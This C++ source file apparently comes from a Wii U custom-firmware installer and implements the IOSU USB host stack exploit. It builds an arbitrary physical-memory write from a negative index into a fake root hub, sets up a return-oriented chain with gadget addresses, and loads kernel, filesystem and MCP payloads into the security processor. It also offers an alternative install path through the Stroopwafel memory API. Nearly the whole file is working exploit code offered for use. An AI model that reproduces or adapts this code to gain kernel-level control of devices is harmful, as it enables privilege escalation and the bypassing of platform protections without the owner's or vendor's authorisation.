#include "exploit.h"
#include "gui.h"
#include "cfw.h"
#include <stroopwafel/stroopwafel.h>

static IOSHandle exploitHandle = -1;

static int32_t* firstChain = (int32_t*)0xF5E00000;
static int8_t* secondChain = (int8_t*)0xF5E20000;
static int8_t* thirdChain = (int8_t*)0xF5E30000;
static int32_t* pretendRootHub = (int32_t*)0xF5E60640;

#pragma GCC diagnostic push 
#pragma GCC diagnostic ignored "-Warray-bounds"
#pragma GCC diagnostic ignored "-Wstringop-overflow="

int uhsWrite32(int32_t physicalAddr, int32_t value) {
    // Put address in first chain which is referenced in the pretend root hub
    firstChain[520] = physicalAddr - 24;    // Address that needs to be written to, minus 24 bytes
    DCStoreRange(firstChain, 0x840);        // Flush current CPU cache so that we're sure that IOSU can read it
    sleep_for(8435000ns);                   // Improve stability by waiting for caches to refresh

    // Use pretendRootHub with a negative index (0 being at 0x10149A6C) to write values that come before the IOSU USB module
    // Each index is 0x144 bytes long, so the pretend root hub needs to be at the exact end of that address: 0x10149A6C + (0x144*-0xB349B) = 0x01E60640.
    // 0x01E60640's physical address is 0xF5E60640, which is free to manipulate since its in MEM1 memory.
    int32_t messageBuffer[] = {-0xB349B, value};
    int32_t replyBuffer[32];
    return IOS_Ioctl(exploitHandle, 0x15, messageBuffer, sizeof(messageBuffer), replyBuffer, sizeof(replyBuffer));
}


void setupExploit() {
    // Clear out memory used for the exploit
    memset(firstChain, 0, 0x00070000);
    DCStoreRange(firstChain, 0x00070000);

    firstChain[5] = 1;
    firstChain[8] = 0x01E00000;

    memcpy(secondChain, secondChainBin, sizeof(secondChainBin));
    memcpy(thirdChain, thirdChainBin, sizeof(thirdChainBin));
    memcpy((char*)(0xF5E40000), ios_kernel_bin, sizeof(ios_kernel_bin));
    memcpy((char*)(0xF5E50000), ios_usb_bin, sizeof(ios_usb_bin));
    memcpy((char*)(0xF5E52500), ios_fs_bin, sizeof(ios_fs_bin));
    *(volatile unsigned int*)0xF5E70000 = sizeof(ios_mcp_bin);
    memcpy((char*)(0xF5E70020), ios_mcp_bin, sizeof(ios_mcp_bin));

    static_assert(sizeof(ios_usb_bin) < 0xF5E54999 - 0xF5E50000, "ios_usb is too big and overlaps with ios_fs");
    static_assert(sizeof(ios_fs_bin) < 0xF5E55000 - 0xF5E52500, "ios_fs is too big and overlaps with next section");

    pretendRootHub[33] = 0x01E00000;
    pretendRootHub[78] = 0;

    // Store current CPU cache into main memory for IOSU to read
    DCStoreRange(firstChain, 0x840);
    DCStoreRange(secondChain, sizeof(secondChainBin));
    DCStoreRange(thirdChain, sizeof(thirdChainBin));
    DCStoreRange((void*)0xF5E40000, sizeof(ios_kernel_bin));
    DCStoreRange((void*)0xF5E50000, sizeof(ios_usb_bin));
    DCStoreRange((void*)0xF5E52500, sizeof(ios_fs_bin));
    DCStoreRange((void*)0xF5E70000, sizeof(ios_mcp_bin) + 0x40);

    DCStoreRange(pretendRootHub, 0x160);
}

#define IOCTL_KILL_SERVER           (0x03)

bool useStroopwafel() {
    WHBLogPrint("Using Stroopwafel to install CFW...");
    WHBLogFreetypeDraw();

    void* kernel_buf = memalign(0x40, sizeof(ios_kernel_bin));
    void* fs_buf     = memalign(0x40, sizeof(ios_fs_bin));
    void* mcp_buf    = memalign(0x40, sizeof(ios_mcp_bin));

    if (!kernel_buf || !fs_buf || !mcp_buf) {
        WHBLogPrint("Failed to allocate aligned buffers!");
        if (kernel_buf) free(kernel_buf);
        if (fs_buf) free(fs_buf);
        if (mcp_buf) free(mcp_buf);
        return false;
    }

    memcpy(kernel_buf, ios_kernel_bin, sizeof(ios_kernel_bin));
    memcpy(fs_buf, ios_fs_bin, sizeof(ios_fs_bin));
    memcpy(mcp_buf, ios_mcp_bin, sizeof(ios_mcp_bin));

    // Prepare kernel binary: set is_exploit to 0
    // The first instruction in crt0.s is now 'mov r0, #1' (0xE3A00001 in big-endian)
    // We want to change it to 'mov r0, #0' (0xE3A00000)
    uint8_t* kernel_ptr = (uint8_t*)kernel_buf;
    if (kernel_ptr[0] == 0xE3 && kernel_ptr[1] == 0xA0 && kernel_ptr[2] == 0x00 && kernel_ptr[3] == 0x01) {
        kernel_ptr[3] = 0x00;
        WHBLogPrint("Modified kernel payload for Stroopwafel launch.");
    } else {
        WHBLogPrint("Warning: Could not find expected 'mov r0, #1' at kernel start.");
    }

    StroopwafelMapMemory mcp_bss_map = {
        .paddr = 0x0827D000, // (0x050BD000 - 0x05000000 + 0x081C0000)
        .vaddr = 0x050BD000,
        .size = 0x3000,
        .domain = 1,
        .type = 3,
        .cached = 0xFFFFFFFF
    };
    Stroopwafel_MapMemory(&mcp_bss_map);

    StroopwafelMapMemory mcp_text_map = {
        .paddr = 0x13D96000, // (0x05116000 - 0x05100000 + 0x13D80000)
        .vaddr = 0x05116000,
        .size = 0x4000,
        .domain = 1,
        .type = 3,
        .cached = 0xFFFFFFFF
    };
    Stroopwafel_MapMemory(&mcp_text_map);

    StroopwafelWrite writes[] = {
        { 0x08135000, kernel_buf, sizeof(ios_kernel_bin) },
        { 0x107F8200, fs_buf,     sizeof(ios_fs_bin) },
        { 0x05116000, mcp_buf,    sizeof(ios_mcp_bin) }
    };

    bool success = true;
    if (Stroopwafel_WriteMemory(3, writes) != STROOPWAFEL_RESULT_SUCCESS) {
        WHBLogPrint("Failed to write binaries via Stroopwafel!");
        success = false;
    }

    if (success && Stroopwafel_Execute(0x08135000, nullptr, 0, nullptr, 0) != STROOPWAFEL_RESULT_SUCCESS) {
        WHBLogPrint("Failed to execute kernel via Stroopwafel!");
        success = false;
    }

    free(kernel_buf);
    free(fs_buf);
    free(mcp_buf);

    if (success) {
        WHBLogPrint("CFW installed via Stroopwafel.");
    }
    return success;
}

bool installCFW() {
    if (isStroopwafelAvailable()) {
        if (!useStroopwafel()) return false;
    } else {
        if (!useExploit()) return false;
    }

    return startCustomThreads();
}

bool startCustomThreads() {
    // Now start iosuhax server
    WHBLogPrint("Starting /dev/iosuhax thread...");
    WHBLogFreetypeDraw();

    IOSHandle mcpHandle = IOS_Open("/dev/mcp", (IOSOpenMode)0);
    if (mcpHandle < 0) {
        WHBLogPrint("Failed to open /dev/mcp bridge!");
        return false;
    }

    {
        int32_t in = IPC_CUSTOM_START_MCP_THREAD;
        int32_t out = 0;
        IOS_Ioctl(mcpHandle, 100, &in, sizeof(in), &out, sizeof(out));
        sleep_for(2s);
    }

    if (USE_DEBUG_STUBS && USE_LIBMOCHA()) {
        int32_t in = IPC_CUSTOM_START_USB_LOGGING;
        int32_t out = 0;
        IOS_Ioctl(mcpHandle, 100, &in, sizeof(in), &out, sizeof(out));
        sleep_for(1s);
    }

    IOS_Close(mcpHandle);
    return true;
}

bool useExploit() {
    if (getCFWVersion() == CFWVersion::SYRUP) {
        WHBLogPrint("Closing Syrup's CFW before re-executing exploit...");
        WHBLogFreetypeDraw();
        sleep_for(2s);

        IOSHandle iosuhaxHandle = IOS_Open("/dev/iosuhax", (IOSOpenMode)0);
        if (iosuhaxHandle >= IOS_ERROR_OK) {
            __attribute__((aligned(0x20))) int32_t res[0x20 >> 2];
            *res = 0;

            IOS_Ioctl(iosuhaxHandle, IOCTL_KILL_SERVER, (void *)nullptr, 0, res, 4);
            IOS_Close(iosuhaxHandle);

            WHBLogPrint("Successfully killed IPC server...");
            WHBLogFreetypeDraw();
            sleep_for(3s);
        }
    }

    WHBLogPrint("Executing exploit...");
    WHBLogPrint("This should take a few seconds.");
    WHBLogPrint("If it gets stuck, hold power button and retry!");
    WHBLogFreetypeDraw();

    exploitHandle = IOS_Open("/dev/uhs/0", IOSOpenMode::IOS_OPEN_READ);
    if (exploitHandle < IOS_ERROR_OK) {
        WHBLogPrintf("Can't initialize /dev/uhs/0! Error: %d", exploitHandle);
        IOS_Close(exploitHandle);
        return false;
    }

    // Setup other chains and payloads
    setupExploit();

    // Set up the first chain that'll lead to the second chain
    uhsWrite32(CHAIN_START+0x14, CHAIN_START + 0x14 + 0x4 + 0x20);
    uhsWrite32(CHAIN_START+0x10, 0x1011814C);
    uhsWrite32(CHAIN_START+0x0C, SOURCE);
    uhsWrite32(CHAIN_START+0x00, 0x1012392b); // pop {R4-R6,PC}

    IOS_Close(exploitHandle);

    return true;
}
#pragma GCC diagnostic pop